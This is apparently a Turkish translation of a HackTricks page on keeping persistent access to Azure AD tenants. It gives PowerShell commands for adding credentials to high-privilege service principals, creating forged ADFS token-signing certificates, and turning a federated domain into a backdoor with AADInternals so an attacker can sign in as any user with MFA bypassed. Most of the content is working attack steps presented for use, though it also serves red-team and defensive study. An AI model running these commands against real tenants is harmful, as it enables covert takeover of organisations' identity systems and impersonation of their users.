# Az - Kalıcılık

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong> ile sıfırdan kahraman olmak için AWS hackleme öğrenin<strong>!</strong></summary>

HackTricks'i desteklemenin diğer yolları:

* Şirketinizi HackTricks'te **reklamını görmek** veya HackTricks'i **PDF olarak indirmek** için [**ABONELİK PLANLARINI**](https://github.com/sponsors/carlospolop) kontrol edin!
* [**Resmi PEASS & HackTricks ürünlerini**](https://peass.creator-spring.com) edinin
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family) keşfedin, özel [**NFT'lerimiz**](https://opensea.io/collection/the-peass-family) koleksiyonumuz
* 💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) **katılın** veya **Twitter** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)**'ı takip edin**.
* **Hacking hilelerinizi** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github reposuna **PR göndererek paylaşın**.

</details>

### Yasadışı Onay Verme

Varsayılan olarak, herhangi bir kullanıcı Azure AD'de bir uygulama kaydedebilir. Bu nedenle, hedef kiracı için yüksek etki izinlere ihtiyaç duyan bir uygulama kaydedebilirsiniz ve yönetici onayıyla (eğer yöneticiyseniz onaylayabilirsiniz) - kullanıcının adına posta gönderme, rol yönetimi vb. gibi. Bu, başarılı bir durumda çok **verimli** olacak bir şekilde **saldırıları** gerçekleştirmemizi sağlar.

Ayrıca, uygulamayı kendi kullanıcınızla kabul ederek üzerinde erişimi sürdürmek de mümkündür.

### Uygulamalar ve Hizmet İlkeleri

Uygulama Yöneticisi, GA veya microsoft.directory/applications/credentials/update izinlerine sahip özel bir rol ile mevcut bir uygulamaya kimlik bilgileri (gizli veya sertifika) ekleyebiliriz.

Yüksek izinlere sahip bir uygulamayı **hedef almak** veya yüksek izinlere sahip bir **yeni bir uygulama eklemek** mümkündür.

Uygulamaya eklemek için ilginç bir rol, **Ayrıcalıklı kimlik doğrulama yöneticisi rolü** olabilir, çünkü Global Yöneticilerin **şifresini sıfırlama** izni verir.

Bu teknik ayrıca **MFA'yı atlamaya** olanak sağlar.

{% code overflow="wrap" %}
```powershell
$passwd = ConvertTo-SecureString "J~Q~QMt_qe4uDzg53MDD_jrj_Q3P.changed" -AsPlainText -Force
$creds = New-Object System.Management.Automation.PSCredential("311bf843-cc8b-459c-be24-6ed908458623", $passwd)
Connect-AzAccount -ServicePrincipal -Credential $credentials -Tenant e12984235-1035-452e-bd32-ab4d72639a
```
{% endcode %}

* Sertifika tabanlı kimlik doğrulama için

{% code overflow="wrap" %}
```powershell
Connect-AzAccount -ServicePrincipal -Tenant <TenantId> -CertificateThumbprint <Thumbprint> -ApplicationId <ApplicationId>
```
{% endcode %}

### Federasyon - Token İmzalama Sertifikası

On-prem AD'de **DA yetkileriyle**, çok uzun bir geçerlilik süresine sahip **yeni Token imzalama** ve **Token Şifreleme sertifikaları** oluşturmak ve bunları içe aktarmak mümkündür. Bu, ImuutableID'sini bildiğimiz herhangi bir kullanıcı olarak **giriş yapmamıza** olanak sağlayacaktır.

Aşağıdaki komutu **ADFS sunucusunda DA olarak çalıştırın** yeni sertifikalar oluşturmak için (varsayılan şifre 'AADInternals'), bunları ADFS'e ekleyin, otomatik yenilemeyi devre dışı bırakın ve hizmeti yeniden başlatın:
```powershell
New-AADIntADFSSelfSignedCertificates
```
Ardından, Azure AD ile sertifika bilgilerini güncelleyin:
```powershell
Update-AADIntADFSFederationSettings -Domain cyberranges.io
```
### Federasyon - Güvenilen Etki Alanı

Bir kiracıda GA yetkileriyle, **yeni bir etki alanı eklemek** (doğrulanmış olmalıdır) mümkündür, kimlik doğrulama türünü Federasyon olarak yapılandırmak ve etki alanını belirli bir sertifikaya (aşağıdaki komutta any.sts) ve yayıncıya güvenmek için yapılandırmak mümkündür:
```powershell
# Using AADInternals
ConvertTo-AADIntBackdoor -DomainName cyberranges.io

# Get ImmutableID of the user that we want to impersonate. Using Msol module
Get-MsolUser | select userPrincipalName,ImmutableID

# Access any cloud app as the user
Open-AADIntOffice365Portal -ImmutableID qIMPTm2Q3kimHgg4KQyveA== -Issuer "http://any.sts/B231A11F" -UseBuiltInCertificate -ByPassMFA$true
```
## Referanslar

* [https://aadinternalsbackdoor.azurewebsites.net/](https://aadinternalsbackdoor.azurewebsites.net/)

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong> ile sıfırdan kahraman olmak için AWS hackleme öğrenin<strong>!</strong></summary>

HackTricks'i desteklemenin diğer yolları:

* Şirketinizi HackTricks'te **reklamınızı görmek** veya **HackTricks'i PDF olarak indirmek** için [**ABONELİK PLANLARI**](https://github.com/sponsors/carlospolop)'na göz atın!
* [**Resmi PEASS & HackTricks ürünlerini**](https://peass.creator-spring.com) edinin
* Özel [**NFT'lerden**](https://opensea.io/collection/the-peass-family) oluşan koleksiyonumuz [**The PEASS Family**](https://opensea.io/collection/the-peass-family)'yi keşfedin
* 💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) **katılın** veya bizi **Twitter** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)**'da takip edin.**
* **Hacking hilelerinizi** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github depolarına **PR göndererek paylaşın**.

</details>
